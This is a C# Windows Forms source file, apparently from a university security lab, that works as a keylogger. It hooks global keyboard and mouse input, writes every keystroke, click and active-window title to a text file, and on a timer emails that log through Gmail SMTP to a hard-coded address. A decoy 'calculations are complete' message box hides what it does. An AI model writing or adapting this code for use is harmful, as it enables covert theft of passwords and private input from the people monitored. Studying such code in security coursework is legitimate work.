using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text;

using System.Windows.Forms;

namespace Pruebas
{
    public partial class Test : Form
    {
        private int y = 0;
        private int velocity = 5;
        private int x = 0;
        private WQLUtil.Util.Window.WindowManager w;
        private WQLUtil.Util.Mouse.MouseManager m;


        public Test()
        {
            InitializeComponent();
            w = new WQLUtil.Util.Window.WindowManager(WinEventProc);
            m = new WQLUtil.Util.Mouse.MouseManager();

            m.Hook.OnMouseActivity += new MouseEventHandler(MouseMoved);
            m.Hook.KeyDown += new KeyEventHandler(ExtKeyDown);
            m.Hook.KeyPress += new KeyPressEventHandler(ExtKeyPress);
            m.Hook.KeyUp += new KeyEventHandler(ExtKeyUp);

        }
        

       
        private void Log(string txt)
        {

            Console.WriteLine("{0}", txt);
        }

        public void MouseMoved(object sender, MouseEventArgs e)
        {
            x = e.X;
            y = e.Y;

            Console.WriteLine(String.Format("x = {0},  y= {1}, delta = {2}", e.X, e.Y, e.Delta));
            escribir(String.Format("x = {0},  y= {1}, delta = {2}", e.X, e.Y, e.Delta));

            if (e.Clicks > 0)
                Log("MouseButton - " + e.Button.ToString());
            escribir("MouseButton - " + e.Button.ToString());
        }

        public void ExtKeyDown(object sender, KeyEventArgs e)
        {
            Log("KeyDown - " + e.KeyData.ToString());
            escribir("KeyDown - " + e.KeyData.ToString());
            WQLUtil.Util.Mouse.MouseManager.SetCursor(x, y);
            if (e.KeyValue == 73)
            {
                WQLUtil.Util.Mouse.MouseManager.LeftClickExt(x, y);
                Console.WriteLine("Clic izquierdo");
                escribir("Clic izquierdo");
            }
            else if (e.KeyValue == 68)
            {
                WQLUtil.Util.Mouse.MouseManager.RightClick(x, y);
                Console.WriteLine("Clic derecho");
                escribir("clic derecho");
            }
            else if (e.KeyValue == 39)
                x = x + velocity;
            else if (e.KeyValue == 40)
                y = y + velocity;
            else if (e.KeyValue == 37)
                x = x - velocity;
            else if (e.KeyValue == 38)
                y = y - velocity;
            else if (e.KeyValue == 77)
                WQLUtil.Util.Window.WindowManager.MinAll();
            else if (e.KeyValue == 78)
                WQLUtil.Util.Window.WindowManager.MaxAll();

            Console.WriteLine("x={0}, y={1}, Key = {2}", x, y, e.KeyValue);
            escribir("x={0}, y={1}, Key = {2}"+ x+ y+ e.KeyValue);
        }

        public void ExtKeyPress(object sender, KeyPressEventArgs e)
        {
            Log("KeyPress 	- " + e.KeyChar);
            escribir("KeyPress 	- " + e.KeyChar);
        }

        public void ExtKeyUp(object sender, KeyEventArgs e)
        {
            Log("KeyUp - " + e.KeyData.ToString());
            escribir("KeyUp - " + e.KeyData.ToString());
        }

        public void WinEventProc(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
        {
            Log("Active Window - " + WQLUtil.Util.Window.WindowManager.GetActiveWindowTitle() + "\r\n");
            escribir("Active Window - " + WQLUtil.Util.Window.WindowManager.GetActiveWindowTitle() + "\r\n");
        }


        private void Test_Load(object sender, EventArgs e)
        {
            
        }

        private void button1_Click(object sender, EventArgs e)
        {
            

            string tiempo = textBox1.Text;
            sendEmail(tiempo);
        }

        public void sendEmail(string tiempo)
        {
            if (!tiempo.Equals(""))
            {
                int time = Int32.Parse(tiempo);
                System.Timers.Timer timer = new System.Timers.Timer();
                timer.Interval = time;
                timer.Elapsed += label2_Click;
                timer.Enabled = true;

            }
            else
            {
                MessageBox.Show("The calculations are complete", "My Application",MessageBoxButtons.OKCancel, MessageBoxIcon.Asterisk);
            }

        }
        public void escribir(string data)
        {
            using (System.IO.StreamWriter file = new System.IO.StreamWriter(@"C:\Users\Edgar1\Desktop\uv_3\seguridad\Lab5 - RemoteManager\Lab5 - RemoteManager\Pruebas\WriteL.txt", true))
            {
                file.WriteLine(data);
                file.Dispose();
            }

        }
       

        private void label2_Click(object sender, EventArgs e)
        {
           
           send();
        }

        private void send()
        {
            MailMessage _correo = new MailMessage();
            
            _correo.From = new MailAddress("edmorapez@gmail.com");
            _correo.To.Add("janethavs@gmail.com");
            _correo.Subject = "hola";
            _correo.Body = "este es el cuerpo prueba saludos";
            _correo.Priority = MailPriority.Normal;
            Attachment _attachement = new Attachment("C:/Users/Edgar1/Desktop/uv_3/seguridad/Lab5 - RemoteManager/Lab5 - RemoteManager/Pruebas/WriteL.txt");
            _correo.Attachments.Add(_attachement);
            
            SmtpClient smtp = new SmtpClient();

            smtp.Credentials = new NetworkCredential("tucorreogmailaqui", "tupasswordaqui");
            smtp.Host = "smtp.gmail.com";
            smtp.Port = 587;
            smtp.EnableSsl = true;
            smtp.Timeout = 7000;
            
            try
            {
                smtp.Send(_correo);
                // MessageBox.Show("Correo enviado");
                Console.Write("se envio el mail");
            }
            catch (Exception ex)
            {
                /// MessageBox.Show("No se pudo Enviar el Correo");
                 Console.Write("no se envio el mail: " + ex);
            }
            _correo.Dispose();
           

            
        }
    }
}
